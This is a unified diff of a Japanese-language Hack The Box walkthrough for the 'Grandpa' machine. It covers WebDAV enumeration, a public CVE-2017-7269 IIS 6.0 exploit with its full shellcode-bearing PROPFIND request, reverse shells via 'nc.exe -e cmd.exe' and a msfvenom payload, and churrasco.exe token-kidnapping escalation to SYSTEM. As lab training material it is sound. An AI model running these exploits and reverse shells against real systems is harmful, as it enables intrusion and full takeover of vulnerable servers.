@@ -3,18 +3,6 @@ https://app.hackthebox.com/machines/Grandpa
 ## STEP 1
 ```sh
 └─$ rustscan -a 10.129.95.233 --scripts none
-.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
-| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
-| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
-`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
-The Modern Day Port Scanner.
-________________________________________
-: http://discord.skerritt.blog         :
-: https://github.com/RustScan/RustScan :
- --------------------------------------
-HACK THE PLANET
-
-[~] The config file is expected to be at "/home/kali/.rustscan.toml"
 [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
 [!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
 Open 10.129.95.233:80
@@ -24,134 +12,34 @@ Open 10.129.95.233:80
 ## STEP 2
 80番にアクセス  
 <img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Grandpa_01.png">  
-ヘッダを確認すると、iis 6.0 っぽい
-```sh
-└─$ curl -I http://10.129.95.233                                      
+OPTIONSヘッダを確認すると、iis6.0かつwebdavで動作しているっぽい
+```SH
+└─$ curl -X OPTIONS -I http://10.129.95.233   
 HTTP/1.1 200 OK
-Content-Length: 1433
-Content-Type: text/html
-Content-Location: http://10.129.95.233/iisstart.htm
-Last-Modified: Fri, 21 Feb 2003 15:48:30 GMT
-Accept-Ranges: bytes
-ETag: "05b3daec0d9c21:300"
+Date: Sun, 10 Aug 2025 14:01:08 GMT
 Server: Microsoft-IIS/6.0
 MicrosoftOfficeWebServer: 5.0_Pub
 X-Powered-By: ASP.NET
-Date: Thu, 17 Jul 2025 01:26:05 GMT
+MS-Author-Via: MS-FP/4.0,DAV
+Content-Length: 0
+Accept-Ranges: none
+DASL: <DAV:sql>
+DAV: 1, 2
+Public: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
+Allow: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
+Cache-Control: private
 ```
-列挙してみるとアクセスできるファイルがあったが、有益そうなものはなかった
+iis6.0 webdav には、cve-2017-7269 がありrceの脆弱性がある  
+[PoC](https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269/)をダウンロード、実行
 ```sh
-└─$ ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.129.95.233/FUZZ 
-
-        /'___\  /'___\           /'___\       
-       /\ \__/ /\ \__/  __  __  /\ \__/       
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
-         \ \_\   \ \_\  \ \____/  \ \_\       
-          \/_/    \/_/   \/___/    \/_/       
-
-       v2.1.0-dev
-________________________________________________
-
- :: Method           : GET
- :: URL              : http://10.129.95.233/FUZZ
- :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
- :: Follow redirects : false
- :: Calibration      : false
- :: Timeout          : 10
- :: Threads          : 40
- :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
-________________________________________________
-
-Images                  [Status: 301, Size: 151, Words: 9, Lines: 2, Duration: 253ms]
-_private                [Status: 403, Size: 1529, Words: 173, Lines: 30, Duration: 302ms]
-_vti_cnf                [Status: 403, Size: 1529, Words: 173, Lines: 30, Duration: 265ms]
-_vti_log                [Status: 403, Size: 1529, Words: 173, Lines: 30, Duration: 300ms]
-_vti_pvt                [Status: 403, Size: 1529, Words: 173, Lines: 30, Duration: 300ms]
-_vti_txt                [Status: 403, Size: 1529, Words: 173, Lines: 30, Duration: 301ms]
-_vti_bin                [Status: 301, Size: 157, Words: 9, Lines: 2, Duration: 343ms]
-_vti_bin/_vti_aut/author.dll [Status: 200, Size: 195, Words: 5, Lines: 13, Duration: 474ms]
-_vti_bin/_vti_adm/admin.dll [Status: 200, Size: 195, Words: 5, Lines: 13, Duration: 474ms]
-_vti_bin/shtml.dll      [Status: 200, Size: 96, Words: 11, Lines: 1, Duration: 476ms]
-aspnet_client           [Status: 403, Size: 218, Words: 14, Lines: 2, Duration: 252ms]
-images                  [Status: 301, Size: 151, Words: 9, Lines: 2, Duration: 252ms]
-:: Progress: [4746/4746] :: Job [1/1] :: 150 req/sec :: Duration: [0:00:32] :: Errors: 0 ::
-```
-使えるhttpメソドを確認すると、PROPFIND があった。  
-こいつは webdav で使われていたもの
-```sh
-└─$ nmap -n -Pn -p80 --script http-methods 10.129.95.233
-Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-19 11:07 EDT
-Nmap scan report for 10.129.95.233
-Host is up (0.33s latency).
-
-PORT   STATE SERVICE
-80/tcp open  http
-| http-methods: 
-|   Supported Methods: OPTIONS TRACE GET HEAD COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT POST MOVE MKCOL PROPPATCH
-|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
-
-Nmap done: 1 IP address (1 host up) scanned in 4.72 seconds
-```
-webdavでは、ファイルを移動したり・アップロードできる  
-`davtest`でファイルアップロードできるかテスト、すべて失敗
-```sh
-└─$ davtest -url http://10.129.95.233
-********************************************************
- Testing DAV connection
-OPEN            SUCCEED:                http://10.129.95.233
-********************************************************
-NOTE    Random string for this session: pJ3Ic1CJYFcLb
-********************************************************
- Creating directory
-MKCOL           FAIL
-********************************************************
- Sending test files
-PUT     cfm     FAIL
-PUT     jsp     FAIL
-PUT     txt     FAIL
-PUT     php     FAIL
-PUT     pl      FAIL
-PUT     aspx    FAIL
-PUT     asp     FAIL
-PUT     cgi     FAIL
-PUT     jhtml   FAIL
-PUT     shtml   FAIL
-PUT     html    FAIL
-
-********************************************************
-/usr/bin/davtest Summary:
-```
-iis6.0 webdav には、cve-2017-7269 が存在しrceできる。  
-[PoC](https://raw.githubusercontent.com/g0rx/iis6-exploit-2017-CVE-2017-7269/refs/heads/master/iis6%20reverse%20shell)をダウンロード、実行
-```sh
-└─$ wget https://raw.githubusercontent.com/g0rx/iis6-exploit-2017-CVE-2017-7269/refs/heads/master/iis6%20reverse%20shell
---2025-07-19 13:09:20--  https://raw.githubusercontent.com/g0rx/iis6-exploit-2017-CVE-2017-7269/refs/heads/master/iis6%20reverse%20shell
-Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.109.133, 185.199.110.133, ...
-Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 12313 (12K) [text/plain]
-Saving to: ‘iis6 reverse shell’
-
-iis6 reverse shell                                         100%[========================================================================================================================================>]  12.02K  --.-KB/s    in 0.003s  
-
-2025-07-19 13:09:20 (4.02 MB/s) - ‘iis6 reverse shell’ saved [12313/12313]
-
-└─$ python3.13 iis6\ reverse\ shell                                 
-  File "/home/kali/iis6 reverse shell", line 6
-    print 'usage:iis6webdav.py targetip targetport reverseip reverseport\n'
-    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-SyntaxError: Missing parentheses in call to 'print'. Did you mean print(...)?
-                                                                                                                                                                                                                                            
-└─$ python2.7 iis6\ reverse\ shell  
-usage:iis6webdav.py targetip targetport reverseip reverseport
+└─$ wget -nv https://raw.githubusercontent.com/g0rx/iis6-exploit-2017-CVE-2017-7269/refs/heads/master/iis6%20reverse%20shell
+2025-07-19 13:09:20 URL:https://raw.githubusercontent.com/g0rx/iis6-exploit-2017-CVE-2017-7269/refs/heads/master/iis6%20reverse%20shell [12313/12313] -> "iis6 reverse shell" [1]
                                                                                                                                                                                                                                       
 └─$ python2.7 iis6\ reverse\ shell 10.129.95.233 80 10.10.16.7 4444
 PROPFIND / HTTP/1.1
 Host: localhost
 Content-Length: 1744
 If: <http://localhost/aaaaaaa潨硣睡焳椶䝲稹䭷佰畓穏䡨噣浔桅㥓偬啧杣㍤䘰硅楒吱䱘橑牁䈱瀵塐㙤汇㔹呪倴呃睒偡㈲测水㉇扁㝍兡塢䝳剐㙰畄桪㍴乊硫䥶乳䱪坺潱塊㈰㝮䭉前䡣潌畖畵景癨䑍偰稶手敗畐橲穫睢癘扈攱ご汹偊呢倳㕷橷䅄㌴摶䵆噔䝬敃瘲牸坩䌸扲娰夸呈ȂȂዀ栃汄剖䬷汭佘塚祐䥪塏䩒䅐晍Ꮐ栃䠴攱潃湦瑁䍬Ꮐ栃千橁灒㌰塦䉌灋捆关祁穐䩬> (Not <locktoken:write1>) <http://localhost/bbbbbbb祈慵佃潧歯䡅㙆杵䐳㡱坥婢吵噡楒橓兗㡎奈捕䥱䍤摲㑨䝘煹㍫歕浈偏穆㑱潔瑃奖潯獁㑗慨穲㝅䵉坎呈䰸㙺㕲扦湃䡭㕈慷䵚慴䄳䍥割浩㙱乤渹捓此兆估硯牓材䕓穣焹体䑖漶獹桷穖慊㥅㘹氹䔱㑲卥塊䑎穄氵婖扁湲昱奙吳ㅂ塥奁煐〶坷䑗卡Ꮐ栃湏栀湏栀䉇癪Ꮐ栃䉗佴奇刴䭦䭂瑤硯悂栁儵牺瑺䵇䑙块넓栀ㅶ湯ⓣ栁ᑠ栃翾￿￿Ꮐ栃Ѯ栃煮瑰ᐴ栃⧧栁鎑栀㤱普䥕げ呫癫牊祡ᐜ栃清栀眲票䵩㙬䑨䵰艆栀䡷㉓ᶪ栂潪䌵ᏸ栃⧧栁VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBRDDKLMN8KPM0KP4KOYM4CQJINDKSKPKPTKKQTKT0D8TKQ8RTJKKX1OTKIGJSW4R0KOIBJHKCKOKOKOF0V04PF0M0A>
-
 ```
 リバースシェル取得！しかしユーザフラグすらとれず
 ```cmd
@@ -161,14 +49,14 @@ connect to [10.10.16.7] from (UNKNOWN) [10.129.95.233] 1030
 Microsoft Windows [Version 5.2.3790]
 (C) Copyright 1985-2003 Microsoft Corp.
 
-c:\windows\system32\inetsrv>cd C:\"Documents and Settings"\Harry
-cd C:\"Documents and Settings"\Harry
+c:\windows\system32\inetsrv>type C:\"Documents and Settings"\Harry\user.txt
+type C:\"Documents and Settings"\Harry\user.txt
 Access is denied.
 ```
 
 
 ## STEP 3
-hotfixはなにもない状態
+hotfixは１つのみ
 ```cmd
 c:\windows\system32\inetsrv>systeminfo
 systeminfo
@@ -208,90 +96,27 @@ Hotfix(s):                 1 Hotfix(s) Installed.
                            [01]: Q147222
 Network Card(s):           N/A
 ```
-iisでrceしたので、もちろんサービスアカウントを侵害した  
-なので、seimpersonate権限がある
+侵害したアカウントは、NetworkService  
+というこどで今回は[CVE-2009-0079](https://learn.microsoft.com/ja-jp/security-updates/securitybulletins/2009/ms09-012#windows-rpcss-service-isolation-vulnerability---cve-2009-0079)で権限昇格を試行
 ```cmd
 c:\windows\system32\inetsrv>whoami
 whoami
 nt authority\network service
-
-c:\windows\system32\inetsrv>whoami /priv
-whoami /priv
-
-PRIVILEGES INFORMATION
-----------------------
-
-Privilege Name                Description                               State   
-============================= ========================================= ========
-SeAuditPrivilege              Generate security audits                  Disabled
-SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
-SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
-SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
-SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
-SeCreateGlobalPrivilege       Create global objects                     Enabled 
 ```
-seimpersonate権限となるとポテト系を想像するが、windows server 2003 だったので churrasco.exe を使えばよいと、  
-searchsploitで確認できた
+PoCの[churrasco.exe](https://github.com/Re4son/Churrasco)をダウンロード  
+msfvenomでリバースシェルペイロード作成  
+churrasco.exe と shell.exe をsmbserverにアップロード
 ```sh
-└─$ searchsploit -x 6705 | grep '.'
-  Exploit: Microsoft Windows Server 2003 - Token Kidnapping Local Privilege Escalation
-      URL: https://www.exploit-db.com/exploits/6705
-     Path: /usr/share/exploitdb/exploits/windows/local/6705.txt
-    Codes: N/A
- Verified: True
-File Type: ASCII text
-(From http://nomoreroot.blogspot.com/2008/10/windows-2003-poc-exploit-for-token.html)
-It has been a long time since Token Kidnapping presentation (http://www.argeniss.com/research/TokenKidnapping.pdf)
-was published so I decided to release a PoC exploit for Win2k3 that alows to execute code under SYSTEM account.
-Basically if you can run code under any service in Win2k3 then you can own Windows, this is because Windows
-services accounts can impersonate.  Other process (not services) that can impersonate are IIS 6 worker processes
-so if you can run code from an ASP .NET or classic ASP web application then you can own Windows too. If you provide
-shared hosting services then I would recomend to not allow users to run this kind of code from ASP.
--SQL Server is a nice target for the exploit if you are a DBA and want to own Windows:
-exec xp_cmdshell 'churrasco "net user /add hacker"'
--Exploiting IIS 6 with ASP .NET :
-...
-System.Diagnostics.Process myP = new System.Diagnostics.Process();
-myP.StartInfo.RedirectStandardOutput = true;
-myP.StartInfo.FileName=Server.MapPath("churrasco.exe");
-myP.StartInfo.UseShellExecute = false;
-myP.StartInfo.Arguments= " \"net user /add hacker\" ";
-myP.Start();
-string output = myP.StandardOutput.ReadToEnd();
-Response.Write(output);
-...
-You can find the PoC exploit here http://www.argeniss.com/research/Churrasco.zip
-backup link: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/6705.zip (2008-Churrasco.zip)
-Enjoy.
-Cesar.
-# milw0rm.com [2008-10-08]
-```
-churrasco.exe をダウンロード  
-churrasco.exe と nc.exe をsmbserverにアップロード
-```sh
-└─$ wget https://github.com/Re4son/Churrasco/raw/refs/heads/master/churrasco.exe             
---2025-07-19 13:53:15--  https://github.com/Re4son/Churrasco/raw/refs/heads/master/churrasco.exe
-Resolving github.com (github.com)... 20.27.177.113
-Connecting to github.com (github.com)|20.27.177.113|:443... connected.
-HTTP request sent, awaiting response... 302 Found
-Location: https://raw.githubusercontent.com/Re4son/Churrasco/refs/heads/master/churrasco.exe [following]
---2025-07-19 13:53:15--  https://raw.githubusercontent.com/Re4son/Churrasco/refs/heads/master/churrasco.exe
-Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.110.133, 185.199.108.133, 185.199.109.133, ...
-Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.110.133|:443... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 31232 (30K) [application/octet-stream]
-Saving to: ‘churrasco.exe’
+└─$ wget -nv https://github.com/Re4son/Churrasco/raw/refs/heads/master/churrasco.exe 
+2025-07-19 13:53:16 URL:https://raw.githubusercontent.com/Re4son/Churrasco/refs/heads/master/churrasco.exe [31232/31232] -> "churrasco.exe" [1]
 
-churrasco.exe                                              100%[========================================================================================================================================>]  30.50K  --.-KB/s    in 0.01s   
-
-2025-07-19 13:53:16 (2.67 MB/s) - ‘churrasco.exe’ saved [31232/31232]
-
-└─$ plocate nc.exe       
-/usr/lib/mono/4.5/cert-sync.exe
-/usr/share/seclists/Web-Shells/FuzzDB/nc.exe
-/usr/share/windows-resources/binaries/nc.exe
-
-└─$ cp /usr/share/windows-resources/binaries/nc.exe .
+└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.23 LPORT=5555 -f exe -o shell.exe                   
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 324 bytes
+Final size of exe file: 73802 bytes
+Saved as: shell.exe
 
 └─$ impacket-smbserver share .
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
@@ -302,12 +127,27 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 [*] Config file parsed
 [*] Config file parsed
 ```
-現パスにwrite権限はないので、C:\wmpub に移動  
-nc.exe をダウンロード
+wrrite権限がある、C:\ADFS に移動  
+shell.exe、churrasco.exe を配送
 ```cmd
-c:\windows\system32\inetsrv>mkdir a
-mkdir a
-Access is denied.
+c:\windows\system32\inetsrv>whoami /groups
+whoami /groups
+
+GROUP INFORMATION
+-----------------
+
+Group Name                       Type             SID                                            Attributes                                        
+================================ ================ ============================================== ==================================================
+NT AUTHORITY\NETWORK SERVICE     User             S-1-5-20                                       Mandatory group, Enabled by default, Enabled group
+Everyone                         Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
+GRANPA\IIS_WPG                   Alias            S-1-5-21-1709780765-3897210020-3926566182-1005 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Performance Log Users    Alias            S-1-5-32-559                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                    Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\SERVICE             Well-known group S-1-5-6                                        Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization   Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
+LOCAL                            Well-known group S-1-2-0                                        Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                    Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
 
 c:\windows\system32\inetsrv>dir C:\
 dir C:\
@@ -328,51 +168,60 @@ dir C:\
                2 File(s)              0 bytes
                7 Dir(s)   1,373,024,256 bytes free
 
-c:\windows\system32\inetsrv>icacls C:\wmpub
-icacls C:\wmpub
-C:\wmpub BUILTIN\Administrators:(F)
-         BUILTIN\Administrators:(I)(OI)(CI)(F)
-         NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
-         CREATOR OWNER:(I)(OI)(CI)(IO)(F)
-         BUILTIN\Users:(I)(OI)(CI)(RX)
-         BUILTIN\Users:(I)(CI)(AD)
-         BUILTIN\Users:(I)(CI)(WD)
+c:\windows\system32\inetsrv>icacls ADFS
+icacls ADFS
+Successfully processed 0 files; Failed processing 1 files
+The system cannot find the file specified.
+
+c:\windows\system32\inetsrv>icacls C:\ADFS
+icacls C:\ADFS
+C:\ADFS BUILTIN\Administrators:(F)
+        BUILTIN\Administrators:(I)(OI)(CI)(F)
+        NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
+        CREATOR OWNER:(I)(OI)(CI)(IO)(F)
+        BUILTIN\Users:(I)(OI)(CI)(RX)
+        BUILTIN\Users:(I)(CI)(AD)
+        BUILTIN\Users:(I)(CI)(WD)
 
 Successfully processed 1 files; Failed processing 0 files
 
-c:\windows\system32\inetsrv>cd C:\wmpub
-cd C:\wmpub
+c:\windows\system32\inetsrv>cd C:\ADFS
+cd C:\ADFS
 
-C:\wmpub>copy \\10.10.16.7\share\nc.exe .
-copy \\10.10.16.7\share\nc.exe .
+C:\ADFS>copy \\10.10.16.23\share\churrasco.exe .
+copy \\10.10.16.23\share\churrasco.exe .
+        1 file(s) copied.
+
+C:\ADFS>copy \\10.10.16.23\share\shell.exe .
+copy \\10.10.16.23\share\shell.exe .
         1 file(s) copied.
 ```
 エクスプロイト！
 ```cmd
-c:\windows\system32\inetsrv>//10.10.16.7/share/churrasco.exe
-//10.10.16.7/share/churrasco.exe
+C:\ADFS>churrasco.exe
+churrasco.exe
 /churrasco/-->Usage: Churrasco.exe [-d] "command to run"
 C:\WINDOWS\TEMP
 
-C:\wmpub>//10.10.16.7/share/churrasco.exe -d "C:\wmpub\nc.exe -e cmd.exe 10.10.16.7 5555"
-//10.10.16.7/share/churrasco.exe -d "C:\wmpub\nc.exe -e cmd.exe 10.10.16.7 5555"
-Access is denied.
+C:\ADFS>churrasco.exe -d C:\ADFS\shell.exe
+churrasco.exe -d C:\ADFS\shell.exe
 /churrasco/-->Current User: NETWORK SERVICE 
 /churrasco/-->Getting Rpcss PID ...
-/churrasco/-->Found Rpcss PID: 664 
+/churrasco/-->Found Rpcss PID: 668 
 /churrasco/-->Searching for Rpcss threads ...
-/churrasco/-->Found Thread: 668 
-/churrasco/-->Thread not impersonating, looking for another thread...
 /churrasco/-->Found Thread: 672 
 /churrasco/-->Thread not impersonating, looking for another thread...
-/churrasco/-->Found Thread: 680 
-/churrasco/-->Thread impersonating, got NETWORK SERVICE Token: 0x72c
+/churrasco/-->Found Thread: 676 
+/churrasco/-->Thread not impersonating, looking for another thread...
+/churrasco/-->Found Thread: 684 
+/churrasco/-->Thread impersonating, got NETWORK SERVICE Token: 0x730
 /churrasco/-->Getting SYSTEM token from Rpcss Service...
-/churrasco/-->Found SYSTEM token 0x724
+/churrasco/-->Found NETWORK SERVICE Token
+/churrasco/-->Found SYSTEM token 0x728
 /churrasco/-->Running command with SYSTEM Token...
 /churrasco/-->Done, command should have ran as SYSTEM!
 ```
-権限昇格成功！ルートフラグゲット
+権限昇格成功！ユーザ・ルートフラグゲット
 ```sh
 └─$ rlwrap nc -lnvp 5555
 listening on [any] 5555 ...
@@ -383,6 +232,10 @@ Microsoft Windows [Version 5.2.3790]
 C:\WINDOWS\TEMP>whoami
 whoami
 nt authority\system
+
+C:\WINDOWS\TEMP>type C:\"Documents and Settings"\Harry\Desktop\user.txt
+type C:\"Documents and Settings"\Harry\Desktop\user.txt
+bdff5ec67c3cff017f2bedc146a5d869
 
 C:\WINDOWS\TEMP>type C:\"Documents and Settings"\Administrator\Desktop\root.txt
 type C:\"Documents and Settings"\Administrator\Desktop\root.txt
